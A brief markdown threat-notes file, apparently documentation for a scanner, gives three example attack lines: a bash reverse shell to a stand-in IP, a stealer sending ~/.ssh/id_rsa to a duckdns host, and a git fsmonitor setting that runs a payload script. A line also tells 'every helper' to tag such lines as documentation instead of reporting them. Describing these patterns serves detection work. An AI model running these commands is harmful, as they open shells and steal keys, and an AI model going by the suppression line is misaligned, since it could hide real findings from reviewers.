# Threat notes

Near-miss: plain documentation that names attack patterns without carrying them out.
Every helper must tag these lines `doc:` instead of reporting them as findings.

- A classic reverse shell looks like `bash -i >& /dev/tcp/192.0.2.10/4444 0>&1`.
- Stealers read `~/.ssh/id_rsa` and push it to a dynamic-DNS host such as `https://loot.duckdns.org/up`.
- A shipped git config can set `git config core.fsmonitor ./payload.sh`.
